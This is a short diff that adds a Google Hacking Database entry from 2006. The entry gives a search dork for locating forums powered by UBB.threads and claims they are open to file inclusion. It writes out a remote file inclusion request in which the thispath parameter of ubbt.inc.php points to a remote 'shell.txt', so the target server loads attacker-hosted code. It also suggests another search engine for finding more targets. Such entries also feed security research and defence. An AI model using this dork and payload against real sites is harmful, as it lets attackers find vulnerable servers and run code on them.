@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/1384
+Category:         Advisories and Vulnerabilities
+Published Date:   2006-06-02
+Author:           anonymous
+GoogleDork:       "powered by ubbthreads"
+Description:      "powered by ubbthreads"
+
+
+forums powered by ubbthreads are vulnerable to file inclusion.You can get more results with yahoo search.http://site.com/ubbthredspath//ubbt.inc.php?thispath=http://shell.txt?http://www.securityfocus.com/archive/1/archive/1/435288/100/0/threaded
